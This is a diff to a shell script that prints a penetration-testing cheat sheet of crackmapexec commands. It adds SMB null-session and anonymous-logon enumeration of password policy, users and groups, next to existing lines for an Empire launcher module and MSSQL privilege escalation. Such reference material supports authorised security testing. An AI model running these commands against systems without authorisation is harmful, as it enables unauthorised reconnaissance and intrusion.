@@ -402,6 +402,17 @@ echo -e ""
 echo -e "${IBLUE}MSSQL${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}empire_exec -o LISRENER=<Listener_Name>${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}mssql_priv${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}NULL Session${RESTORE}"
+echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --pass-pol"
+echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --users"
+echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --groups"
+echo -e ""
+echo -e "${IBLUE}Anonymous Logon${RESTORE}"
+echo -e "crackmapexec smb $IP -u 'a' -p '' -d $Domain"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
 
 ################################################################################
 # End	                                                                       #
